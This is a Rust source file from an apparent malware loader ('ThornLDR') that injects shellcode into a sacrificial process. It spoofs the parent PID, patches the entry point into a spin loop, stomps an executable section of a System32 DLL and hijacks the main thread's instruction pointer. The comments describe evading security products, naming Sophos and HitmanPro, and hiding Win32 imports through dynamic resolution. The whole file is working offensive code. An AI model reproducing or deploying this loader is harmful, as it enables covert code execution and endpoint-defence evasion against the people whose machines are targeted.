// injection.rs
// Spawns a sacrificial process with a spoofed parent PID, then injects
// shellcode via VirtualAllocEx -> WriteProcessMemory -> CreateRemoteThread.
// All sensitive Win32 functions are resolved dynamically at runtime via
// dynload — none appear in the PE import table.

use std::ffi::c_void;

use windows::Win32::System::Threading::{
    PROCESS_INFORMATION, STARTUPINFOEXW, STARTUPINFOW,
    LPPROC_THREAD_ATTRIBUTE_LIST,
    CREATE_SUSPENDED, EXTENDED_STARTUPINFO_PRESENT,
};

use crate::dynload;
use crate::utils::to_wide_null;

// PROC_THREAD_ATTRIBUTE_PARENT_PROCESS
const PARENT_PROCESS_ATTR: usize  = 0x00020000;
// Win32 constants (avoids pulling in windows crate features for these)
const PROCESS_ALL_ACCESS:   u32  = 0x001FFFFF;
const SCN_MEM_EXECUTE: u32 = 0x2000_0000;
const SCN_MEM_READ:    u32 = 0x4000_0000;
const PAGE_READWRITE:       u32  = 0x04;
const PAGE_EXECUTE_READ:    u32  = 0x20;

unsafe fn find_remote_stomp_target(
    h_process:      *mut c_void,
    shellcode_len:  usize,
    fn_enum:        crate::dynload::FnEnumProcessModules,
    fn_name:        crate::dynload::FnGetModuleFileNameExA,
    fn_read:        crate::dynload::FnReadProcessMemory,
) -> Option<*mut c_void> {
    let mut modules = vec![std::ptr::null_mut::<c_void>(); 256];
    let mut needed: u32 = 0;
    fn_enum(h_process, modules.as_mut_ptr(), (256 * 8) as u32, &mut needed);
    let count = (needed as usize / 8).min(256);

    // index 0 is the exe itself — skip it
    for i in 1..count {
        let base = modules[i];
        if base.is_null() { continue; }

        // get module filename to check deny list
        let mut name_buf = vec![0u8; 260];
        let name_len = fn_name(h_process, base, name_buf.as_mut_ptr(), 260) as usize;
        if name_len == 0 { continue; }
        let name = &name_buf[..name_len];

        // find last backslash/forward slash and check suffix
        let basename_start = name.iter().rposition(|&b| b == b'\\' || b == b'/').map(|p| p + 1).unwrap_or(0);
        let basename = &name[basename_start..];
        let mut lower = [0u8; 64];
        let blen = basename.len().min(64);
        for j in 0..blen {
            lower[j] = basename[j].to_ascii_lowercase();
        }
        let lb = &lower[..blen];
        // Deny list: threads are suspended before stomping so we only need to
        // exclude DLLs that ThornLDR itself calls (kernel32/ntdll/kernelbase)
        // and security products with self-integrity monitoring.
        if lb == b"ntdll.dll"
            || lb == b"kernel32.dll"
            || lb == b"kernelbase.dll"
            || lb == b"hmpalert.dll"
        {
            continue;
        }

        // Only stomp DLLs sitting directly in System32 / SysWOW64.
        // Security products (HitmanPro hmpalert.dll, Sophos SophosED.dll, etc.)
        // install their hook DLLs into subdirectories of System32, e.g.
        //   C:\Windows\System32\SophosED\SophosED.dll
        // Legitimate Windows DLLs are always flat in System32:
        //   C:\Windows\System32\msvcp_win.dll
        // Check: the directory part of the path (everything before the last
        // backslash) must end with "system32" or "syswow64".
        {
            let dirname = if basename_start > 0 { &name[..basename_start - 1] } else { &name[..0] };
            let dlen = dirname.len();
            let ends_sys32   = dlen >= 8 && dirname[dlen-8..].eq_ignore_ascii_case(b"system32");
            let ends_syswow  = dlen >= 8 && dirname[dlen-8..].eq_ignore_ascii_case(b"syswow64");
            if !ends_sys32 && !ends_syswow {
                continue;
            }
        }

        // read PE headers
        let mut hdr = vec![0u8; 4096];
        let mut read: usize = 0;
        if fn_read(h_process, base as *const c_void, hdr.as_mut_ptr() as *mut c_void, 4096, &mut read) == 0 {
            continue;
        }
        if read < 0x40 { continue; }

        let e_lfanew = u32::from_le_bytes(hdr[0x3C..0x40].try_into().ok()?) as usize;
        if e_lfanew + 24 + 2 > read { continue; }

        let num_sections = u16::from_le_bytes(hdr[e_lfanew+6..e_lfanew+8].try_into().ok()?) as usize;
        let opt_hdr_size = u16::from_le_bytes(hdr[e_lfanew+20..e_lfanew+22].try_into().ok()?) as usize;
        let first_sec = e_lfanew + 24 + opt_hdr_size;

        for s in 0..num_sections {
            let sec = first_sec + s * 40;
            if sec + 40 > read { break; }
            let virt_size = u32::from_le_bytes(hdr[sec+8..sec+12].try_into().ok()?) as usize;
            let virt_addr = u32::from_le_bytes(hdr[sec+12..sec+16].try_into().ok()?) as usize;
            let chars     = u32::from_le_bytes(hdr[sec+36..sec+40].try_into().ok()?);
            if (chars & SCN_MEM_EXECUTE) != 0 && (chars & SCN_MEM_READ) != 0 && virt_size >= shellcode_len {
                return Some((base as usize + virt_addr) as *mut c_void);
            }
        }
    }
    None
}


// THREADENTRY32 layout (28 bytes total):
//   +0  dwSize             u32
//   +4  cntUsage           u32
//   +8  th32ThreadID       u32
//   +12 th32OwnerProcessID u32
//   +16 tpBasePri          i32
//   +20 tpDeltaPri         i32
//   +24 dwFlags            u32
const THREADENTRY32_SIZE: usize = 28;
const TH32CS_SNAPTHREAD:   u32  = 0x00000004;
const THREAD_SUSPEND_RESUME: u32 = 0x0002;
const INVALID_HANDLE: isize     = -1;

/// Suspend every thread in `target_pid` except `exempt_tid`.
/// Returns a Vec of open thread handles (already suspended) so the caller
/// can resume them later.  Handles must be closed by the caller.
unsafe fn suspend_process_threads(
    target_pid:  u32,
    exempt_tid:  u32,
    fn_snapshot: crate::dynload::FnSnapshot,
    fn_t32first: crate::dynload::FnThread32First,
    fn_t32next:  crate::dynload::FnThread32Next,
    fn_open_thr: crate::dynload::FnOpenThread,
    fn_suspend:  crate::dynload::FnSuspendThread,
) -> Vec<*mut c_void> {
    let mut handles = Vec::new();
    let snap = fn_snapshot(TH32CS_SNAPTHREAD, 0);
    if snap as isize == INVALID_HANDLE || snap.is_null() { return handles; }

    let mut entry = [0u8; THREADENTRY32_SIZE];
    // dwSize must be set before the first call
    let size_ptr = entry.as_mut_ptr() as *mut u32;
    *size_ptr = THREADENTRY32_SIZE as u32;

    if fn_t32first(snap, entry.as_mut_ptr()) == 0 {
        crate::dynload::close_handle().map(|ch| ch(snap));
        return handles;
    }

    loop {
        let owner_pid = u32::from_le_bytes(entry[12..16].try_into().unwrap_or([0;4]));
        let tid       = u32::from_le_bytes(entry[8..12].try_into().unwrap_or([0;4]));

        if owner_pid == target_pid && tid != exempt_tid {
            let h = fn_open_thr(THREAD_SUSPEND_RESUME, 0, tid);
            if !h.is_null() && h as isize != INVALID_HANDLE {
                fn_suspend(h);
                handles.push(h);
            }
        }

        // Reset dwSize for next call
        *size_ptr = THREADENTRY32_SIZE as u32;
        if fn_t32next(snap, entry.as_mut_ptr()) == 0 { break; }
    }

    crate::dynload::close_handle().map(|ch| ch(snap));
    handles
}

/// Inject `shellcode` into a freshly spawned sacrificial process.
pub fn inject(parent_pid: u32, shellcode: &[u8]) -> Result<(), String> {
    unsafe {
        // ── Resolve all APIs up front ─────────────────────────────────────────
        let fn_open_process    = dynload::open_process()
            .ok_or("resolve: OpenProcess")?;
        let fn_close_handle    = dynload::close_handle()
            .ok_or("resolve: CloseHandle")?;
        let fn_read_mem      = dynload::read_process_memory()   
            .ok_or("resolve: ReadProcessMemory")?;
        let fn_enum_modules  = dynload::enum_process_modules()  
            .ok_or("resolve: K32EnumProcessModules")?;
        let fn_get_filename  = dynload::get_module_filename_ex()
            .ok_or("resolve: K32GetModuleFileNameExA")?;
        let fn_write_mem       = dynload::write_process_memory()
            .ok_or("resolve: WriteProcessMemory")?;
        let fn_virtual_protect  = dynload::virtual_protect_ex()
            .ok_or("resolve: VirtualProtectEx")?;
        let fn_init_attr       = dynload::init_proc_thread_attr()
            .ok_or("resolve: InitializeProcThreadAttributeList")?;
        let fn_update_attr     = dynload::update_proc_thread_attr()
            .ok_or("resolve: UpdateProcThreadAttribute")?;
        let fn_delete_attr     = dynload::delete_proc_thread_attr()
            .ok_or("resolve: DeleteProcThreadAttributeList")?;
        let fn_create_process  = dynload::create_process_w()
            .ok_or("resolve: CreateProcessW")?;
        let fn_resume    = dynload::resume_thread()
            .ok_or("resolve: ResumeThread")?;
        let fn_suspend   = dynload::suspend_thread()
            .ok_or("resolve: SuspendThread")?;
        let fn_nt_qip    = dynload::nt_query_information_process()
            .ok_or("resolve: NtQueryInformationProcess")?;
        let fn_sleep     = dynload::sleep()
            .ok_or("resolve: Sleep")?;
        let fn_t32first  = dynload::thread32_first()
            .ok_or("resolve: Thread32First")?;
        let fn_t32next   = dynload::thread32_next()
            .ok_or("resolve: Thread32Next")?;
        let fn_open_thr  = dynload::open_thread()
            .ok_or("resolve: OpenThread")?;


        // ── Step 1: Open a handle to the spoofed parent ───────────────────────
        let parent_handle = fn_open_process(PROCESS_ALL_ACCESS, 0, parent_pid);
        if parent_handle.is_null() {
            return Err("OpenProcess failed".into());
        }

        // ── Step 2: Size the PROC_THREAD_ATTRIBUTE_LIST buffer ────────────────
        let mut attr_size: usize = 0;
        fn_init_attr(std::ptr::null_mut(), 1, 0, &mut attr_size);

        let mut attr_buf = vec![0u8; attr_size];
        let attr_list    = attr_buf.as_mut_ptr() as *mut c_void;

        if fn_init_attr(attr_list, 1, 0, &mut attr_size) == 0 {
            let _ = fn_close_handle(parent_handle);
            return Err("InitializeProcThreadAttributeList failed".into());
        }

        // ── Step 3: Set the spoofed parent ────────────────────────────────────
        if fn_update_attr(
            attr_list, 0, PARENT_PROCESS_ATTR,
            &parent_handle as *const *mut c_void as *const c_void,
            std::mem::size_of::<*mut c_void>(),
            std::ptr::null_mut(), std::ptr::null_mut(),
        ) == 0 {
            fn_delete_attr(attr_list);
            let _ = fn_close_handle(parent_handle);
            return Err("UpdateProcThreadAttribute failed".into());
        }

        // ── Step 4: Populate STARTUPINFOEXW ──────────────────────────────────
        let mut si_ex: STARTUPINFOEXW = std::mem::zeroed();
        si_ex.StartupInfo.cb  = std::mem::size_of::<STARTUPINFOEXW>() as u32;
        si_ex.lpAttributeList = LPPROC_THREAD_ATTRIBUTE_LIST(attr_list as *mut _);

        let mut pi: PROCESS_INFORMATION = std::mem::zeroed();

        // ── Step 5: Spawn sacrificial process (suspended, spoofed parent) ─────
        let target_str = unsafe { crate::config::STAGER_CONFIG.inject_target() }.to_owned();
        let mut target_path = to_wide_null(&target_str);
        let flags = CREATE_SUSPENDED.0 | EXTENDED_STARTUPINFO_PRESENT.0;

        if fn_create_process(
            std::ptr::null(),
            target_path.as_mut_ptr(),
            std::ptr::null(), std::ptr::null(),
            0, flags,
            std::ptr::null(), std::ptr::null(),
            &si_ex as *const STARTUPINFOEXW as *const STARTUPINFOW,
            &mut pi,
        ) == 0 {
            fn_delete_attr(attr_list);
            let _ = fn_close_handle(parent_handle);
            return Err("CreateProcessW failed".into());
        }
        // ── Step 5b: Patch OEP to infinite loop ──────────────────────────────────
        // NtQueryInformationProcess(ProcessBasicInformation=0) → PEB address.
        // Read PEB+0x10 → ImageBaseAddress (reliable even pre-resume with ASLR).
        // Patch AddressOfEntryPoint with JMP-to-self (EB FE): after the DLL loader
        // maps all imports the main thread spins there and never enters DLL code,
        // so we can stomp any section without a race.
        {
            let mut pbi = [0u8; 48]; // PROCESS_BASIC_INFORMATION is 48 bytes on x64
            let mut ret_len: u32 = 0;
            if fn_nt_qip(pi.hProcess.0 as *mut c_void, 0,
                         pbi.as_mut_ptr() as *mut c_void, 48, &mut ret_len) == 0
            {
                // PebBaseAddress is at offset 8 in PROCESS_BASIC_INFORMATION
                let peb_addr = usize::from_le_bytes(pbi[8..16].try_into().unwrap_or([0;8]));
                if peb_addr != 0 {
                    // ImageBaseAddress is at PEB+0x10
                    let mut img_base_bytes = [0u8; 8];
                    let mut nr: usize = 0;
                    if fn_read_mem(pi.hProcess.0 as *mut c_void,
                                   (peb_addr + 0x10) as *const c_void,
                                   img_base_bytes.as_mut_ptr() as *mut c_void,
                                   8, &mut nr) != 0 && nr == 8
                    {
                        let exe_base = usize::from_le_bytes(img_base_bytes);
                        if exe_base != 0 {
                            let mut hdr = [0u8; 0x200];
                            nr = 0;
                            if fn_read_mem(pi.hProcess.0 as *mut c_void,
                                           exe_base as *const c_void,
                                           hdr.as_mut_ptr() as *mut c_void,
                                           0x200, &mut nr) != 0 && nr >= 0x44
                            {
                                let e_lfanew = u32::from_le_bytes(
                                    hdr[0x3C..0x40].try_into().unwrap_or([0;4])) as usize;
                                // AddressOfEntryPoint: PE sig(4) + COFF(20) + 16 into opt hdr
                                let oep_off = e_lfanew + 40;
                                if oep_off + 4 <= nr {
                                    let oep_rva = u32::from_le_bytes(
                                        hdr[oep_off..oep_off+4].try_into().unwrap_or([0;4])) as usize;
                                    let oep_va = exe_base + oep_rva;
                                    let mut old: u32 = 0;
                                    if fn_virtual_protect(pi.hProcess.0 as *mut c_void,
                                                          oep_va as *mut c_void, 2,
                                                          PAGE_READWRITE, &mut old) != 0
                                    {
                                        let jmp_self: [u8; 2] = [0xEB, 0xFE];
                                        fn_write_mem(pi.hProcess.0 as *mut c_void,
                                                     oep_va as *mut c_void,
                                                     jmp_self.as_ptr() as *const c_void,
                                                     2, std::ptr::null_mut());
                                        let mut dummy: u32 = 0;
                                        fn_virtual_protect(pi.hProcess.0 as *mut c_void,
                                                           oep_va as *mut c_void, 2,
                                                           old, &mut dummy);
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }

        // Resume — DLL loader maps all imports, then main thread spins at OEP.
        fn_resume(pi.hThread.0 as *mut c_void);
        fn_sleep(500);
        

        // ── Step 5c: Suspend all threads before stomping ──────────────────────
        // Background threads (DPI, message loop, COM, etc.) will fault if they
        // execute code in the DLL section we overwrite.  Suspend every thread
        // in the process now so the stomp + loader execution races nothing.
        // The main thread is already spinning at the OEP infinite loop.
        // Exempt the main thread — we redirect it via SetThreadContext separately.
        // Suspending it here increments its count to 2; one resume wouldn't be
        // enough and the thread would stay suspended indefinitely.
        let suspended_handles = suspend_process_threads(
            pi.dwProcessId, pi.dwThreadId,
            dynload::toolhelp32_snapshot().unwrap(),
            fn_t32first, fn_t32next, fn_open_thr, fn_suspend,
        );

        // ── Step 6: Find stomp target and write blob ──────────────────────────
        // Preferred: stomp an existing MEM_IMAGE RX section — memory appears as
        // a legitimate DLL mapping. Fallback: VirtualAllocEx RW → write → RX.
        // Private RX (never RWX) is significantly less flagged than private RWX.
        let stomp_addr: *mut c_void = match unsafe {
            find_remote_stomp_target(
                pi.hProcess.0 as *mut c_void,
                shellcode.len(),
                fn_enum_modules,
                fn_get_filename,
                fn_read_mem,
            )
        } {
            Some(addr) => {
                // Stomp path: RX → RW → write → RX
                let mut old_prot: u32 = 0;
                if fn_virtual_protect(pi.hProcess.0 as *mut c_void, addr,
                                      shellcode.len(), PAGE_READWRITE, &mut old_prot) == 0 {
                    fn_delete_attr(attr_list);
                    let _ = fn_close_handle(parent_handle);
                    let _ = fn_close_handle(pi.hProcess.0 as *mut c_void);
                    let _ = fn_close_handle(pi.hThread.0 as *mut c_void);
                    return Err("VirtualProtectEx RW failed".into());
                }
                if fn_write_mem(pi.hProcess.0 as *mut c_void, addr,
                                shellcode.as_ptr() as *const c_void,
                                shellcode.len(), std::ptr::null_mut()) == 0 {
                    fn_delete_attr(attr_list);
                    let _ = fn_close_handle(parent_handle);
                    let _ = fn_close_handle(pi.hProcess.0 as *mut c_void);
                    let _ = fn_close_handle(pi.hThread.0 as *mut c_void);
                    return Err("WriteProcessMemory failed".into());
                }
                fn_virtual_protect(pi.hProcess.0 as *mut c_void, addr,
                                   shellcode.len(), PAGE_EXECUTE_READ, &mut old_prot);
                addr
            }
            None => {
                // Fallback: allocate private RW, write, harden to RX — never touch RWX
                let fn_valloc_ex = dynload::virtual_alloc_ex()
                    .ok_or("resolve: VirtualAllocEx")?;
                const MEM_COMMIT_RESERVE: u32 = 0x3000;
                let alloc = fn_valloc_ex(
                    pi.hProcess.0 as *mut c_void,
                    std::ptr::null_mut(),
                    shellcode.len(),
                    MEM_COMMIT_RESERVE,
                    PAGE_READWRITE,
                );
                if alloc.is_null() {
                    fn_delete_attr(attr_list);
                    let _ = fn_close_handle(parent_handle);
                    let _ = fn_close_handle(pi.hProcess.0 as *mut c_void);
                    let _ = fn_close_handle(pi.hThread.0 as *mut c_void);
                    return Err("VirtualAllocEx fallback failed".into());
                }
                if fn_write_mem(pi.hProcess.0 as *mut c_void, alloc,
                                shellcode.as_ptr() as *const c_void,
                                shellcode.len(), std::ptr::null_mut()) == 0 {
                    fn_delete_attr(attr_list);
                    let _ = fn_close_handle(parent_handle);
                    let _ = fn_close_handle(pi.hProcess.0 as *mut c_void);
                    let _ = fn_close_handle(pi.hThread.0 as *mut c_void);
                    return Err("WriteProcessMemory fallback failed".into());
                }
                let mut old_prot: u32 = 0;
                fn_virtual_protect(pi.hProcess.0 as *mut c_void, alloc,
                                   shellcode.len(), PAGE_EXECUTE_READ, &mut old_prot);
                alloc
            }
        };

        // ── Step 9: Hijack main thread RIP instead of CreateRemoteThread ────────
        // Sophos terminates threads created via CreateRemoteThread into non-image
        // memory before they execute a single instruction. Instead, suspend the
        // main thread (which is spinning at our OEP EB FE patch), capture its
        // CONTEXT, redirect RIP to our shellcode, then resume. No new thread is
        // created — we reuse the existing main thread.
        //
        // x64 CONTEXT layout (1232 bytes, ContextFlags at +0, Rip at +248):
        //   https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-context
        const CONTEXT_SIZE:     usize = 1232;
        const CONTEXT_FULL:     u32   = 0x00100007; // CONTEXT_CONTROL|INTEGER|SEGMENTS|x64
        const FLAGS_OFFSET:     usize = 48;  // ContextFlags: after P1Home..P6Home (6×8 = 48 bytes)
        const RIP_OFFSET:       usize = 248; // Rip field offset in x64 CONTEXT

        let fn_get_ctx = dynload::get_thread_context().ok_or("resolve: GetThreadContext")?;
        let fn_set_ctx = dynload::set_thread_context().ok_or("resolve: SetThreadContext")?;

        // Suspend the main thread so we can safely modify its context.
        fn_suspend(pi.hThread.0 as *mut c_void);

        // x64 CONTEXT must be 16-byte aligned. Vec<u8> is 1-byte aligned, so
        // GetThreadContext silently corrupts data if the pointer isn't aligned.
        // Over-allocate by 15 bytes and manually align up to the next 16B boundary.
        let mut ctx_raw = vec![0u8; CONTEXT_SIZE + 15];
        let ctx_aligned = (ctx_raw.as_mut_ptr() as usize + 15) & !15usize;
        let ctx = ctx_aligned as *mut u8;

        // ContextFlags is at offset 48 (after P1Home..P6Home = 6×8 bytes)
        let flags_ptr = ctx.add(FLAGS_OFFSET) as *mut u32;
        *flags_ptr = CONTEXT_FULL;

        if fn_get_ctx(pi.hThread.0 as *mut c_void, ctx) != 0 {
            // Redirect RIP to our shellcode
            let rip_ptr = ctx.add(RIP_OFFSET) as *mut u64;
            *rip_ptr = stomp_addr as u64;
            *flags_ptr = CONTEXT_FULL;
            fn_set_ctx(pi.hThread.0 as *mut c_void, ctx);
        }

        // Resume the main thread — it now runs our shellcode.
        fn_resume(pi.hThread.0 as *mut c_void);

        // Resume the background threads we suspended before stomping.
        if let Some(fn_res) = dynload::resume_thread() {
            for h in &suspended_handles {
                fn_res(*h);
                if let Some(ch) = dynload::close_handle() { ch(*h as *mut c_void); }
            }
        }

        // ── Step 10: Clean up ─────────────────────────────────────────────────
        fn_delete_attr(attr_list);
        let _ = fn_close_handle(parent_handle);
        let _ = fn_close_handle(pi.hProcess.0 as *mut c_void);
        let _ = fn_close_handle(pi.hThread.0 as *mut c_void);

        Ok(())
    }
}
